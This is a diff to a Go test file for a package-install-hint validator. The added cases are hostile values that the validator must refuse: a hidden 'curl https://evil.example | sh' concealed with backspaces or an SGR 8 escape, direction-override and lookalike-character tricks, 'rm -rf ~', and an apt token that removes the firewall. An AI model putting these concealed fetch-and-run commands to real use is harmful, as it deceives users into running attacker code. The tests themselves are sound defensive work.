@@ -52,9 +52,10 @@ func hintProblems(t *testing.T, kind Kind, value string) (strict, tolerant []str
 }
 
 // A HINT'S PACKAGE PART IS PLAIN PACKAGE NAMES, so it cannot smuggle shell into the slot the
-// install command is built around (the maintainer's ruling, 2026-10-01). `yolo host apply
-// --assert` runs a remedy through `sh -c` after one confirm, so a hint whose package slot
-// carries `;` or `$(…)` is a command hidden where the reader expects a name. Every case is
+// install command is built around (the maintainer's ruling, 2026-10-01). `yolo check-deps`
+// and `yolo host apply` print the remedy for the user to run, and a one-package hint is
+// written into the bundle file (a Brewfile is Ruby), so a hint whose package slot carries `;`
+// or `$(…)` is a command hidden where the reader expects a name. Every case is
 // refused through the real decode, on both kinds that read install_hints, and the refusal
 // names the manager key, the bin, the offending character and the one visible way to chain a
 // step.
@@ -85,6 +86,33 @@ func TestInstallHintsRefuseShellInThePackagePart(t *testing.T) {
 		{"multi-line step", "fd-find && sudo ln -sf a b\nrm -rf ~", []string{"one line"}},
 		{"empty value", "", []string{"no package"}},
 		{"blank value", "   ", []string{"no package"}},
+
+		// A token a manager reads as something other than a package to install. apt reads
+		// a trailing "-" as REMOVE ("apt install fd-find ufw-" takes the firewall away), and
+		// a token starting with "." is a path: apt and dnf install "./<file>" as given, and
+		// a lone "." or ".." names a directory, never a package.
+		{"trailing dash", "fd-find ufw-", []string{`"ufw-"`, "remove"}},
+		{"lone trailing dash token", "-", []string{`"-"`, "option"}},
+		{"a token of one dot", "fd-find .", []string{`"."`, "path"}},
+		{"a token of dots", "..", []string{`".."`, "path"}},
+		{"a relative path", "./evil.deb", []string{`"./evil.deb"`, "path"}},
+
+		// A STEP THAT DOES NOT PRINT AS ITSELF. The step is free shell because the remedy is
+		// printed whole for the user to read and run; a character a terminal does not show
+		// as itself breaks that. Backspaces overwrite what came before, an escape sequence
+		// can conceal the rest of the line (SGR 8) while a copy of it still carries the text,
+		// a direction override or a zero-width character reorders or hides it, and a
+		// lookalike letter names a different command than the one it shows.
+		{"backspaces in the step", "fd-find && sudo ln -sf a b; curl https://evil.example | sh" +
+			strings.Repeat("\b", 37) + "sudo ln -sf a b" + strings.Repeat(" ", 22),
+			[]string{`"\b"`, "printable ASCII"}},
+		{"escape sequence in the step", "fd-find && true\x1b[8m; curl https://evil.example | sh\x1b[0m",
+			[]string{`"\x1b"`, "printable ASCII"}},
+		{"direction override in the step", "fd-find && echo \u202ehs | lruc", []string{`"\u202e"`}},
+		{"zero-width space in the step", "fd-find && sudo\u200b ln -sf a b", []string{`"\u200b"`}},
+		{"tab in the step", "fd-find && sudo\tln -sf a b", []string{`"\t"`}},
+		{"NUL in the step", "fd-find && echo \x00", []string{`"\x00"`}},
+		{"lookalike letter in the step", "fd-find && \u0455udo ln -sf a b", []string{"\"\u0455\""}},
 	}
 	for _, kind := range []Kind{KindRequires, KindProgram} {
 		for _, tc := range cases {
@@ -126,6 +154,9 @@ func TestInstallHintsConventionalFormsDecode(t *testing.T) {
 		"python312Packages.pip",    // a nix attribute path
 		"gcc-c++ make",             // dnf's spelling of g++
 		"c++utilities",
+		"g++", // a trailing "+" is apt's INSTALL suffix, which is what the hint asks anyway
+		"libstdc++6:i386",
+		"fd-find && [ -x /usr/local/bin/fd ] || sudo ln -sf /usr/lib/cargo/bin/fd /usr/local/bin/fd",
 		"pkg && sudo sh -c 'echo x > /etc/y'; hash -r", // free shell after the separator
 		"  fd-find  ", // surrounding spaces are not a problem
 	} {
